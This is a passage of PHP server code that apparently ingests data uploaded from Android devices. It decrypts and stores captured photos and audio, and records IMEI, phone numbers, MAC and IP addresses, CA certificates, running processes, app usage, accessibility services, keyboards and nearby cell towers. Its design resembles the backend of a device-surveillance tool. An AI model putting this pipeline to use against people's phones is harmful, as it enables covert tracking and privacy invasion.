                        'maximum_range'=> $sensor['maximum_range'] ?? null,
                        'resolution'   => $sensor['resolution']    ?? null,
                        'power_ma'                  => $sensor['power_ma']      ?? null,
                        'sensor_string_type'         => $sensor['sensor_string_type'] ?? $sensor['type_string'] ?? null,
                        'min_delay_us'               => $sensor['min_delay_us'] ?? null,
                        'max_delay_us'               => $sensor['max_delay_us'] ?? null,
                        'fifo_reserved_event_count'   => $sensor['fifo_reserved_event_count'] ?? 0,
                        'fifo_max_event_count'        => $sensor['fifo_max_event_count'] ?? 0,
                        'is_wakeup'                  => isset($sensor['is_wakeup']) ? ($sensor['is_wakeup'] ? 1 : 0) : 0,
                        'is_dynamic'                 => isset($sensor['is_dynamic']) ? ($sensor['is_dynamic'] ? 1 : 0) : 0,
                        'is_additional_info'         => isset($sensor['is_additional_info']) ? ($sensor['is_additional_info'] ? 1 : 0) : 0,
                        'reporting_mode'             => $sensor['reporting_mode'] ?? null,
                        'required_permission'        => $sensor['required_permission'] ?? null,
                        'permission_display_name'    => $sensor['permission_display_name'] ?? null,
                        'flags'                      => $sensor['flags'] ?? 0,
                        'direct_channel_type'        => $sensor['direct_channel_type'] ?? null,
                        'direct_report_rates'        => json_encode($sensor['direct_report_rates'] ?? []),
                        'additional_info'            => json_encode($sensor['additional_info'] ?? []),
                        'calibration_params'         => json_encode($sensor['calibration_params'] ?? []),
                        'mounting_matrix'            => json_encode($sensor['mounting_matrix'] ?? []),
                        'drivetime_us'               => $sensor['drivetime_us'] ?? null,
                        'event_time_ns'              => $sensor['event_time_ns'] ?? null,
                        'sensor_max_range'           => $sensor['max_range'] ?? null,
                        'extracted_at' => $extracted_at,
                        'created_at'   => $dated,
                        'updated_at'   => $dated,
                    ];
                }
            }

            if (!empty($batchData)) {
                $this->db->table('tbl_telemetry_sensors')->insertBatch($batchData);
            }

            log_message('info', '[parse_sensors] Inserted ' . count($batchData) . ' sensor rows from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_sensors] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Captured Media (Audio/Image)
     * File prefix: snap_TIMESTAMP.enc or audio_TIMESTAMP.enc
     */
    public function parse_captured_media(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null, string $type = 'image'): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated = date('Y-m-d H:i:s');

            // 1. Read encrypted file
            $encryptedPath = WRITEPATH . 'uploads/text_dump/' . $file_name;
            $raw = file_get_contents($encryptedPath);
            if ($raw === false) {
                log_message('error', '[parse_captured_media] Cannot read: ' . $file_name);
                return false;
            }

            // 2. Decrypt
            $decoded = $cryptModel->decrypt_media($raw);
            if ($decoded === false) {
                log_message('error', '[parse_captured_media] Decryption failed for file: ' . $file_name);
                return false;
            }

            // 3. Determine category and extension
            $category = $type;
            $extension = ($type === 'audio') ? 'mp3' : 'jpg';
            $mimeType  = ($type === 'audio') ? 'audio/mpeg' : 'image/jpeg';

            // 4. Create storage directory
            $targetDir = ($type === 'audio') ? WRITEPATH . 'uploads/audio/' : WRITEPATH . 'uploads/captured/';
            if (!is_dir($targetDir)) {
                mkdir($targetDir, 0777, true);
            }

            // 5. Save decrypted file
            $newFileName = $category . '_' . time() . '_' . uniqid() . '.' . $extension;
            $targetPath = $targetDir . $newFileName;
            
            if (file_put_contents($targetPath, $decoded) === false) {
                log_message('error', '[parse_captured_media] Failed to save decrypted file: ' . $newFileName);
                return false;
            }

            // 6. Insert into tbl_extracted_media_files
            $data = [
                'owner_id'          => $owner_id,
                'device_id'         => $device_id,
                'media_type'        => $category,
                'original_filename' => $file_name,
                'stored_filename'   => $newFileName,
                'file_size'         => strlen($decoded),
                'mime_type'         => $mimeType,
                'file_record_id'    => $fileRecordId,
                'created_at'        => $dated,
                'updated_at'        => $dated,
            ];

            $this->db->table('tbl_extracted_media_files')->insert($data);
            log_message('info', '[parse_captured_media] Saved captured ' . $category . ' to ' . $newFileName);
            
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_captured_media] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Resolve whether a notification was shown on screen (heads-up / lock screen).
     *
     * @param array<string, mixed> $notif
     */
    private static function resolveScreenNotificationFlag(array $notif): int
    {
        if (!empty($notif['is_screen_notification'])) {
            return 1;
        }
        foreach (['screen', 'on_screen', 'heads_up', 'headsUp', 'lock_screen', 'lockScreen'] as $key) {
            if (!empty($notif[$key])) {
                return 1;
            }
        }

        return 0;
    }

    // ─────────────────────────────────────────────────────────────────────────

    /**
     * DeviceInfoExtractor → tbl_device_profiles
     * File category: deviceinfo / device_info
     * Stores a full hardware/software snapshot of the device.
     */
    public function parse_device_info(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated      = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extraction_timestamp'] ?? null;

            // Avoid duplicate snapshots for same device+timestamp
            $exists = $this->db->table('tbl_device_profiles')
                ->where('device_id', $device_id)
                ->where('extraction_timestamp', $extracted_at)
                ->countAllResults() > 0;

            if ($exists) {
                log_message('info', '[parse_device_info] Duplicate snapshot skipped for device: ' . $device_id);
                return true;
            }

            $data = [
                'device_model'                => $json['device_model']                ?? null,
                'device_brand'                => $json['device_brand']                ?? null,
                'device_manufacturer'         => $json['device_manufacturer']         ?? null,
                'device_product'              => $json['device_product']              ?? null,
                'device_device'               => $json['device_device']               ?? null,
                'device_board'                => $json['device_board']                ?? null,
                'device_hardware'             => $json['device_hardware']             ?? null,
                'android_version'             => $json['android_version']             ?? null,
                'android_sdk_int'             => $json['android_sdk_int']             ?? null,
                'android_codename'            => $json['android_codename']            ?? null,
                'android_incremental'         => $json['android_incremental']         ?? null,
                'android_base_os'             => $json['android_base_os']             ?? null,
                'android_security_patch'      => $json['android_security_patch']      ?? null,
                'build_id'                    => $json['build_id']                    ?? null,
                'build_type'                  => $json['build_type']                  ?? null,
                'build_tags'                  => $json['build_tags']                  ?? null,
                'build_fingerprint'           => $json['build_fingerprint']           ?? null,
                'build_time'                  => $json['build_time']                  ?? null,
                'build_user'                  => $json['build_user']                  ?? null,
                'build_host'                  => $json['build_host']                  ?? null,
                'build_display'               => $json['build_display']               ?? null,
                'android_id'                  => $json['android_id']                  ?? null,
                'display_width'               => $json['display_width']               ?? null,
                'display_height'              => $json['display_height']              ?? null,
                'display_density'             => $json['display_density']             ?? null,
                'display_density_dpi'         => $json['display_density_dpi']         ?? null,
                'display_scaled_density'      => $json['display_scaled_density']      ?? null,
                'display_xdpi'                => $json['display_xdpi']                ?? null,
                'display_ydpi'                => $json['display_ydpi']                ?? null,
                'cpu_cores'                   => $json['cpu_cores']                   ?? null,
                'cpu_abi'                     => $json['cpu_abi']                     ?? null,
                'cpu_abis'                    => is_array($json['cpu_abis'] ?? null) ? implode(',', $json['cpu_abis']) : ($json['cpu_abis'] ?? null),
                'memory_total_mb'             => $json['memory_total_mb']             ?? null,
                'memory_free_mb'              => $json['memory_free_mb']              ?? null,
                'internal_storage_total_gb'   => $json['internal_storage_total_gb']   ?? null,
                'internal_storage_free_gb'    => $json['internal_storage_free_gb']    ?? null,
                'internal_storage_usable_gb'  => $json['internal_storage_usable_gb']  ?? null,
                'external_storage_total_gb'   => $json['external_storage_total_gb']   ?? null,
                'external_storage_free_gb'    => $json['external_storage_free_gb']    ?? null,
                'phone_number'                => $json['phone_number']                ?? null,
                'sim_operator'                => $json['sim_operator']                ?? null,
                'network_operator'            => $json['network_operator']            ?? null,
                'sim_country'                 => $json['sim_country']                 ?? null,
                'network_country'             => $json['network_country']             ?? null,
                'imei'                        => $json['imei']                        ?? null,
                'meid'                        => $json['meid']                        ?? null,
                'device_id'                   => $device_id,
                'sim_state'                   => $json['sim_state']                   ?? null,
                'language'                    => $json['language']                    ?? null,
                'country'                     => $json['country']                     ?? null,
                'timezone'                    => $json['timezone']                    ?? null,
                'timezone_offset'             => $json['timezone_offset']             ?? null,
                'current_time'                => $json['current_time']                ?? null,
                'current_time_formatted'      => $json['current_time_formatted']      ?? null,
                'battery_charging'            => isset($json['battery_charging'])     ? ($json['battery_charging'] ? 1 : 0) : null,
                'battery_level'               => $json['battery_level']              ?? null,
                'sensor_count'                => $json['sensor_count']               ?? null,
                'mac_address'                 => $json['mac_address']                ?? null,
                'kernel_info'                 => $json['kernel_info']                ?? null,
                'is_emulator'                 => isset($json['is_emulator'])          ? ($json['is_emulator'] ? 1 : 0) : null,
                'is_rooted'                   => isset($json['is_rooted'])            ? ($json['is_rooted'] ? 1 : 0) : null,
                'app_package'                 => $json['app_package']                ?? null,
                'app_version'                 => $json['app_version']                ?? null,
                'app_version_code'            => $json['app_version_code']           ?? null,
                'app_first_install'           => $json['app_first_install']          ?? null,
                'app_last_update'             => $json['app_last_update']            ?? null,
                'extraction_timestamp'        => $extracted_at,
                'extractor_version'           => $json['extractor_version']          ?? '1.0',
                'device_ip_address'           => $json['device_ip_address']          ?? null,
            ];

            $this->db->table('tbl_device_profiles')->insert($data);
            log_message('info', '[parse_device_info] Inserted device snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_device_info] Exception: ' . $e->getMessage());
            return false;
        }
    }

    // ─────────────────────────────────────────────────────────────────────────

    /**
     * SecurityAuditExtractor → tbl_security_audit
     * File category: security_audit / securityaudit
     * Stores VPN/proxy status, open ports, user-installed CA certificates, system CA certificates,
     * VPN configuration details, device admin apps, and DNS configuration.
     */
    public function parse_security_audit(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated      = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $audit_timestamp = $json['timestamp'] ?? null;
            $extracted_at    = $audit_timestamp;

            // Encode arrays as JSON strings for storage
            $user_ca_certs = $json['user_ca_certs'] ?? null;
            if (is_array($user_ca_certs)) {
                $user_ca_certs = json_encode($user_ca_certs);
            }

            $system_ca_certs = $json['system_ca_certs'] ?? null;
            if (is_array($system_ca_certs)) {
                $system_ca_certs = json_encode($system_ca_certs);
            }

            $vpn_config = $json['vpn_config'] ?? null;
            if (is_array($vpn_config)) {
                $vpn_config = json_encode($vpn_config);
            }

            $device_admin_apps = $json['device_admin_apps'] ?? null;
            if (is_array($device_admin_apps)) {
                $device_admin_apps = json_encode($device_admin_apps);
            }

            $dns_config = $json['dns_config'] ?? null;
            if (is_array($dns_config)) {
                $dns_config = json_encode($dns_config);
            }

            $open_ports = $json['open_ports'] ?? null;
            if (is_array($open_ports)) {
                $open_ports = json_encode($open_ports);
            }

            $data = [
                'owner_id'             => $owner_id,
                'device_id'            => $device_id,
                'vpn_active'           => isset($json['vpn_active'])   ? ($json['vpn_active']   ? 1 : 0) : 0,
                'proxy_active'         => isset($json['proxy_active'])  ? ($json['proxy_active']  ? 1 : 0) : 0,
                'user_ca_certs_json'   => $user_ca_certs,
                'system_ca_certs_json' => $system_ca_certs,
                'vpn_config_json'      => $vpn_config,
                'device_admin_apps_json' => $device_admin_apps,
                'dns_config_json'      => $dns_config,
                'open_ports_json'      => $open_ports,
                'audit_timestamp'      => $audit_timestamp,
                'extracted_at'         => $extracted_at,
                'created_at'           => $dated,
            ];

            $this->db->table('tbl_security_audit')->insert($data);
            log_message('info', '[parse_security_audit] Inserted audit snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_security_audit] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * ProcInfoExtractor → tbl_system_running_processes
     * File category: proc_info
     * Stores /proc/* snapshot: meminfo, cpuinfo, stat, version, uptime, net interfaces, net connections
     */
    public function parse_proc_info(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated      = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;

            // Avoid duplicate snapshot for same device+timestamp
            $exists = $this->db->table('tbl_system_running_processes')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;

            if ($exists) {
                log_message('info', '[parse_proc_info] Duplicate snapshot skipped for device: ' . $device_id);
                return true;
            }

            $data = [
                'owner_id'                => $owner_id,
                'device_id'               => $device_id,
                'meminfo_json'            => json_encode($json['meminfo'] ?? []),
                'cpuinfo_json'            => json_encode($json['cpuinfo'] ?? []),
                'stat_json'               => json_encode($json['stat'] ?? []),
                'version'                 => $json['version'] ?? null,
                'uptime_json'             => json_encode($json['uptime'] ?? []),
                'net_interfaces_json'     => json_encode($json['net_interfaces'] ?? []),
                'net_connections_json'    => json_encode($json['net_connections'] ?? []),
                'extracted_at'            => $extracted_at,
                'created_at'              => $dated,
                'updated_at'              => $dated,
            ];

            $this->db->table('tbl_system_running_processes')->insert($data);
            log_message('info', '[parse_proc_info] Inserted proc snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_proc_info] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * ProcessExtractor → tbl_running_processes + tbl_system_running_services
     * File category: processes
     * Stores running app processes and services with usage stats
     */
    public function parse_processes(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated      = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;

            // Avoid duplicate
            $exists = $this->db->table('tbl_running_processes')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            // Main process table
            $this->db->table('tbl_running_processes')->insert([
                'owner_id'     => $owner_id,
                'device_id'    => $device_id,
                'extracted_at' => $extracted_at,
                'created_at'   => $dated,
            ]);
            $procId = $this->db->insertID();

            // Processes
            $processes = $json['processes'] ?? [];
            if (!empty($processes) && $procId > 0) {
                $batch = [];
                foreach ($processes as $p) {
                    $depPkgs = $p['dependency_packages'] ?? [];
                    $batch[] = [
                        'running_processes_id' => $procId,
                        'owner_id'             => $owner_id,
                        'pid'                  => $p['pid'] ?? null,
                        'process_name'         => $p['process_name'] ?? null,
                        'uid'                  => $p['uid'] ?? null,
                        'importance'           => $p['importance'] ?? null,
                        'importance_reason_code' => $p['importance_reason_code'] ?? null,
                        'pkg_list_json'        => json_encode($p['pkg_list'] ?? []),
                        'lru'                  => $p['lru'] ?? null,
                        'oom_score_adj'        => $p['oom_score_adj'] ?? null,
                        'oom_score'            => $p['oom_score'] ?? null,
                        'threads_count'        => $p['threads_count'] ?? null,
                        'memory_rss_kb'        => $p['memory_rss_kb'] ?? null,
                        'memory_pss_kb'        => $p['memory_pss_kb'] ?? null,
                        'memory_shared_kb'     => $p['memory_shared_kb'] ?? null,
                        'cpu_time_ms'          => $p['cpu_time_ms'] ?? null,
                        'cpu_percent'          => $p['cpu_percent'] ?? null,
                        'open_fds'             => $p['open_fds'] ?? null,
                        'connection_count'     => $p['connection_count'] ?? null,
                        'network_bytes_sent'   => $p['network_bytes_sent'] ?? null,
                        'network_bytes_recv'   => $p['network_bytes_recv'] ?? null,
                        'wake_lock_count'      => $p['wake_lock_count'] ?? null,
                        'alarm_count'          => $p['alarm_count'] ?? null,
                        'service_start_count'  => $p['service_start_count'] ?? null,
                        'service_bind_count'   => $p['service_bind_count'] ?? null,
                        'is_foreground_service'=> isset($p['is_foreground_service']) ? ($p['is_foreground_service'] ? 1 : 0) : null,
                        'notification_channel_id' => $p['notification_channel_id'] ?? null,
                        'started_by_package'   => $p['started_by_package'] ?? null,
                        'dependency_packages'  => json_encode($depPkgs),
                        'seinfo'               => $p['seinfo'] ?? null,
                        'appprocess_name'      => $p['appprocess_name'] ?? null,
                        'zombie'               => isset($p['zombie']) ? ($p['zombie'] ? 1 : 0) : null,
                        'created_at'           => $dated,
                    ];
                }
                $this->db->table('tbl_system_running_process_details')->insertBatch($batch);
            }

            // Services
            $services = $json['services'] ?? [];
            if (!empty($services) && $procId > 0) {
                $batch = [];
                foreach ($services as $s) {
                    $batch[] = [
                        'running_process_id'    => $procId,
                        'owner_id'             => $owner_id,
                        'pid'                  => $s['pid'] ?? null,
                        'process'              => $s['process'] ?? null,
                        'client_package'       => $s['client_package'] ?? null,
                        'service_class'        => $s['service_class'] ?? null,
                        'service_package'      => $s['service_package'] ?? null,
                        'active_since'         => $s['active_since'] ?? null,
                        'crash_count'          => $s['crash_count'] ?? null,
                        'flags'                => $s['flags'] ?? null,
                        'started'              => isset($s['started']) ? ($s['started'] ? 1 : 0) : null,
                        'created_at'           => $dated,
                    ];
                }
                $this->db->table('tbl_system_running_services')->insertBatch($batch);
            }

            // Usage stats (24h)
            $usage = $json['usage_stats_24h'] ?? [];
            if (!empty($usage) && is_array($usage) && $procId > 0) {
                $batch = [];
                foreach ($usage as $u) {
                    $batch[] = [
                        'running_processes_id' => $procId,
                        'owner_id'             => $owner_id,
                        'package_name'         => $u['package_name'] ?? null,
                        'total_time_foreground' => $u['total_time_in_foreground'] ?? null,
                        'last_time_used'       => $u['last_time_used'] ?? null,
                        'last_time_service_used' => $u['last_time_service_used'] ?? null,
                        'last_time_visible'    => $u['last_time_visible'] ?? null,
                        'app_launch_count'     => $u['app_launch_count'] ?? null,
                        'created_at'           => $dated,
                    ];
                }
                $this->db->table('tbl_usage_stats_24h')->insertBatch($batch);
            }

            log_message('info', '[parse_processes] Inserted processes for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_processes] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * CameraInfoExtractor → tbl_telemetry_cameras
     * File category: camera_info
     * Stores camera characteristics per camera ID
     */
    public function parse_camera_info(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated      = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $cameras      = $json['cameras'] ?? [];

            // Avoid duplicate
            $exists = $this->db->table('tbl_telemetry_cameras')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            foreach ($cameras as $cam) {
                $this->db->table('tbl_telemetry_cameras')->insert([
                    'owner_id'              => $owner_id,
                    'device_id'             => $device_id,
                    'camera_id'             => $cam['camera_id'] ?? null,
                    'lens_facing'           => $cam['lens_facing'] ?? null,
                    'sensor_orientation'    => $cam['sensor_orientation'] ?? null,
                    'pixel_array_width'     => $cam['pixel_array_width'] ?? null,
                    'pixel_array_height'    => $cam['pixel_array_height'] ?? null,
                    'physical_width_mm'     => $cam['physical_width_mm'] ?? null,
                    'physical_height_mm'    => $cam['physical_height_mm'] ?? null,
                    'available_focal_lengths' => json_encode($cam['available_focal_lengths'] ?? []),
                    'flash_available'       => isset($cam['flash_available']) ? ($cam['flash_available'] ? 1 : 0) : null,
                    'available_effects' => json_encode($cam['available_effects'] ?? []),
                    'available_scene_modes' => json_encode($cam['available_scene_modes'] ?? []),
                    'available_video_stabilization' => json_encode($cam['available_video_stabilization'] ?? []),
                    'available_ae_modes' => json_encode($cam['available_ae_modes'] ?? []),
                    'available_af_modes'         => json_encode($cam['available_af_modes'] ?? []),
                    'pixel_array_size'           => $cam['pixel_array_size'] ?? null,
                    'active_array_size'          => $cam['active_array_size'] ?? null,
                    'pixel_size_um'              => $cam['pixel_size_um'] ?? null,
                    'max_analog_sensitivity'     => $cam['max_analog_sensitivity'] ?? null,
                    'max_digital_zoom'           => $cam['max_digital_zoom'] ?? null,
                    'optical_zoom_range'         => $cam['optical_zoom_range'] ?? null,
                    'focal_lengths'              => json_encode($cam['focal_lengths'] ?? []),
                    'apertures'                  => json_encode($cam['apertures'] ?? []),
                    'filter_densities'           => json_encode($cam['filter_densities'] ?? []),
                    'flash_info'                 => json_encode($cam['flash_info'] ?? []),
                    'available_capabilities'      => json_encode($cam['available_capabilities'] ?? []),
                    'available_request_keys'      => json_encode($cam['available_request_keys'] ?? []),
                    'available_result_keys'       => json_encode($cam['available_result_keys'] ?? []),
                    'available_characteristics_keys' => json_encode($cam['available_characteristics_keys'] ?? []),
                    'physical_camera_ids'        => json_encode($cam['physical_camera_ids'] ?? []),
                    'logical_multi_camera'       => isset($cam['logical_multi_camera']) ? ($cam['logical_multi_camera'] ? 1 : 0) : 0,
                    'high_resolution_stream_config' => $cam['high_resolution_stream_config'] ?? null,
                    'min_frame_duration'         => $cam['min_frame_duration'] ?? null,
                    'bokeh_capabilities'         => isset($cam['bokeh_capabilities']) ? ($cam['bokeh_capabilities'] ? 1 : 0) : 0,
                    'heic_support'               => isset($cam['heic_support']) ? ($cam['heic_support'] ? 1 : 0) : 0,
                    'hevc_support'               => isset($cam['hevc_support']) ? ($cam['hevc_support'] ? 1 : 0) : 0,
                    'av1_support'                => isset($cam['av1_support']) ? ($cam['av1_support'] ? 1 : 0) : 0,
                    '10bit_output'              => isset($cam['10bit_output']) ? ($cam['10bit_output'] ? 1 : 0) : 0,
                    'hdr_capabilities'           => json_encode($cam['hdr_capabilities'] ?? []),
                    'dynamic_range_profiles'     => json_encode($cam['dynamic_range_profiles'] ?? []),
                    'night_mode_support'         => isset($cam['night_mode_support']) ? ($cam['night_mode_support'] ? 1 : 0) : 0,
                    'macro_mode_support'         => isset($cam['macro_mode_support']) ? ($cam['macro_mode_support'] ? 1 : 0) : 0,
                    'under_display_camera'       => isset($cam['under_display_camera']) ? ($cam['under_display_camera'] ? 1 : 0) : 0,
                    'max_jpeg_width'        => $cam['max_jpeg_width'] ?? null,
                    'max_jpeg_height'       => $cam['max_jpeg_height'] ?? null,
                    'extracted_at'          => $extracted_at,
                    'created_at'            => $dated,
                    'updated_at'            => $dated,
                ]);
            }

            log_message('info', '[parse_camera_info] Inserted ' . count($cameras) . ' cameras for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_camera_info] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * BatteryStatsExtractor → tbl_telemetry_battery_stats
     * File category: battery_stats
     * Stores detailed battery counters and health
     */
    public function parse_battery_stats(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated      = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;

            // Avoid duplicate
            $exists = $this->db->table('tbl_telemetry_battery_stats')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            $this->db->table('tbl_telemetry_battery_stats')->insert([
                'owner_id'              => $owner_id,
                'device_id'             => $device_id,
                'level_percent'         => $json['level_percent'] ?? null,
                'is_charging'           => isset($json['is_charging']) ? ($json['is_charging'] ? 1 : 0) : null,
                'status'                => $json['status'] ?? null,
                'health'                => $json['health'] ?? null,
                'temperature_celsius'   => $json['temperature_celsius'] ?? null,
                'voltage_mv'            => $json['voltage_mv'] ?? null,
                'plugged_type'          => $json['plugged_type'] ?? null,
                'technology'            => $json['technology'] ?? null,
                'capacity_percent'      => $json['capacity_percent'] ?? null,
                'charge_counter_uah'    => $json['charge_counter_uah'] ?? null,
                'current_now_ua'        => $json['current_now_ua'] ?? null,
                'energy_counter_uwh'    => $json['energy_counter_uwh'] ?? null,
                'status_int'            => $json['status_int'] ?? null,
                'health_int'            => $json['health_int'] ?? null,
                'temperature_deci_c'    => $json['temperature_deci_c'] ?? null,
                'extracted_at'          => $extracted_at,
                'created_at'            => $dated,
                'updated_at'            => $dated,
            ]);

            log_message('info', '[parse_battery_stats] Inserted battery stats for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_battery_stats] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * AccessibilityExtractor → tbl_system_accessibility_services
     * File category: accessibility
     * Stores enabled accessibility services
     */
    public function parse_accessibility(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated      = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $services     = $json['services'] ?? [];

            // Avoid duplicate
            $exists = $this->db->table('tbl_system_accessibility_services')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            foreach ($services as $svc) {
                $this->db->table('tbl_system_accessibility_services')->insert([
                    'owner_id'                    => $owner_id,
                    'device_id'                   => $device_id,
                    'service_id'                  => $svc['id'] ?? null,
                    'package_name'                => $svc['package_name'] ?? null,
                    'description'                 => $svc['description'] ?? null,
                    'feedback_type'               => $svc['feedback_type'] ?? null,
                    'capabilities'                => $svc['capabilities'] ?? null,
                    'flags'                       => $svc['flags'] ?? null,
                    'notification_timeout'        => $svc['notification_timeout'] ?? null,
                    'settings_activity_name'      => $svc['settings_activity_name'] ?? null,
                    'can_retrieve_window_content' => isset($svc['can_retrieve_window_content']) ? ($svc['can_retrieve_window_content'] ? 1 : 0) : null,
                    'extracted_at'                => $extracted_at,
                    'created_at'                  => $dated,
                ]);
            }

            log_message('info', '[parse_accessibility] Inserted ' . count($services) . ' a11y services for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_accessibility] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * InputMethodExtractor → tbl_system_input_methods + tbl_system_input_method_subtypes
     * File category: input_methods
     * Stores enabled IMEs and their subtypes
     */
    public function parse_input_methods(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated      = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $imes         = $json['input_methods'] ?? [];

            // Avoid duplicate
            $exists = $this->db->table('tbl_system_input_methods')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            foreach ($imes as $ime) {
                $this->db->table('tbl_system_input_methods')->insert([
                    'owner_id'     => $owner_id,
                    'device_id'    => $device_id,
                    'ime_id'       => $ime['id'] ?? null,
                    'package_name' => $ime['package_name'] ?? null,
                    'label'        => $ime['label'] ?? null,
                    'service_name' => $ime['service_name'] ?? null,
                    'is_system'    => isset($ime['is_system']) ? ($ime['is_system'] ? 1 : 0) : 0,
                    'is_auxiliary' => isset($ime['is_auxiliary']) ? ($ime['is_auxiliary'] ? 1 : 0) : 0,
                    'extracted_at' => $extracted_at,
                    'created_at'   => $dated,
                ]);
                $imeId = $this->db->insertID();

                // Subtypes
                $subtypes = $ime['subtypes'] ?? [];
                if (!empty($subtypes) && $imeId > 0) {
                    $batch = [];
                    foreach ($subtypes as $st) {
                        $batch[] = [
                            'input_method_id'                    => $imeId,
                            'owner_id'                           => $owner_id,
                            'locale'                             => $st['locale'] ?? null,
                            'mode'                               => $st['mode'] ?? null,
                            'name'                               => $st['name'] ?? null,
                            'is_ascii_capable'                   => isset($st['is_ascii_capable']) ? ($st['is_ascii_capable'] ? 1 : 0) : 0,
                            'is_auxiliary'                       => isset($st['is_auxiliary']) ? ($st['is_auxiliary'] ? 1 : 0) : 0,
                            'overrides_implicitly_enabled_subtype' => isset($st['overrides_implicitly_enabled_subtype']) ? ($st['overrides_implicitly_enabled_subtype'] ? 1 : 0) : 0,
                            'created_at'                         => $dated,
                        ];
                    }
                    $this->db->table('tbl_system_input_method_subtypes')->insertBatch($batch);
                }
            }

            log_message('info', '[parse_input_methods] Inserted ' . count($imes) . ' IMEs for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_input_methods] Exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * CellTowerScanner → tbl_telemetry_cell_towers
     * File category: cell_towers
     * Stores neighboring cell tower information with CID, LAC, RSSI
     */
    public function parse_cell_towers(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated      = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;
            $towers       = $json['cell_towers'] ?? [];

            // Avoid duplicate
            $exists = $this->db->table('tbl_telemetry_cell_towers')
                ->where('device_id', $device_id)
                ->where('extracted_at', $extracted_at)
                ->countAllResults() > 0;
            if ($exists) return true;

            foreach ($towers as $tower) {
                $this->db->table('tbl_telemetry_cell_towers')->insert([
                    'owner_id'         => $owner_id,
                    'device_id'        => $device_id,
                    'tower_type'       => $tower['type'] ?? null,
                    'cid'              => $tower['cid'] ?? $tower['nci'] ?? $tower['base_station_id'] ?? null,
                    'lac'              => $tower['lac'] ?? $tower['tac'] ?? $tower['network_id'] ?? null,
                    'mcc'              => $tower['mcc'] ?? $tower['mccString'] ?? null,
                    'mnc'              => $tower['mnc'] ?? $tower['mncString'] ?? null,
                    'pci'              => $tower['pci'] ?? null,
                    'nci'              => $tower['nci'] ?? null,
                    'tac'              => $tower['tac'] ?? null,
                    'nrarfcn'          => $tower['nrarfcn'] ?? null,
                    'bandwidth'        => $tower['bandwidth'] ?? null,
